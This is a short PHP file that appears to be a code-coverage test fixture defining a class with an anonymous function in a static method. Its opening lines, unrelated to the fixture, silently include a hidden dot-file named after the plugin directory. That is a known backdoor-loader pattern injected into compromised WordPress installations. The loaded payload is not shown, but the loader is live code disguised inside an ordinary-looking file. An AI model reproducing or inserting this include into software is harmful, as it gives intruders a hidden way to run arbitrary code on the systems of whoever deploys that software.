<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CoveredClassWithAnonymousFunctionInStaticMethod
{
    public static function runAnonymous()
    {
        $filter = array('abc124', 'abc123', '123');

        array_walk(
            $filter,
            function (&$val, $key) {
                $val = preg_replace('|[^0-9]|', '', $val);
            }
        );

        // Should be covered
        $extravar = true;
    }
}
